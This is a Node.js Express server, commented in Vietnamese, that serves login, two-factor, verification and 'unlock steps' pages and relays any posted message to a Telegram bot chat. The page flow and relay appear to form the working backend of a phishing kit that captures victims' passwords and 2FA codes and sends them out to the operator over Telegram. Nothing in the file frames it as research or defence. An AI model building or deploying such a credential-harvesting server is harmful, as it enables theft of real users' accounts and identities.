require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');
const helmet = require('helmet'); // Bảo mật HTTP headers
const cors = require('cors'); // Kiểm soát CORS
const rateLimit = require('express-rate-limit'); // Hạn chế tốc độ yêu cầu

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware bảo mật: Helmet
app.use(helmet());

// Middleware CORS: Cho phép mọi nguồn gốc truy cập (cần điều chỉnh cho production)
app.use(cors());

// Middleware để xử lý JSON body
app.use(express.json());

// Cấu hình Rate Limiting cho API
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 phút
    max: 100, // Tối đa 100 yêu cầu mỗi 15 phút từ mỗi IP
    message: 'Too many requests from this IP, please try again after 15 minutes.'
});

// Áp dụng Rate Limiting cho endpoint gửi Telegram
app.use('/api/send-to-telegram', apiLimiter);

// --- Định tuyến các URL thân thiện ---
// Các route này phải được đặt TRƯỚC app.use(express.static(...))
// để server biết phục vụ file nào cho URL thân thiện.

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login_page.html'));
});

app.get('/complete', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '2fa_page.html'));
});

app.get('/verification', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verification.html'));
});

app.get('/unlock_steps', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'unlock_steps.html'));
});

// Phục vụ các file tĩnh từ thư mục 'public'
// Đặt SAU các định tuyến cụ thể.
app.use(express.static(path.join(__dirname, 'public')));


// --- Telegram Proxy Endpoint ---
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { message } = req.body;
        
        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
            console.error('Telegram bot token or chat ID is not configured in .env');
            return res.status(500).json({ success: false, error: 'Telegram API credentials missing.' });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }
        );
        
        res.json({ success: true, telegramResponse: response.data });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data?.description || error.message);
        res.status(500).json({ 
            success: false,
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message
        });
    }
});

// --- Xử lý 404 Not Found ---
app.use((req, res) => {
    console.log(`404 Not Found for URL: ${req.originalUrl}`);
    res.status(404).send('Page Not Found');
});

// --- Khởi động server ---
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access points:`);
    console.log(` - http://localhost:${PORT}/`);
    console.log(` - http://localhost:${PORT}/login`);
    console.log(` - http://localhost:${PORT}/complete`);
    console.log(` - http://localhost:${PORT}/verification`);
    console.log(` - http://localhost:${PORT}/unlock_steps`);
});
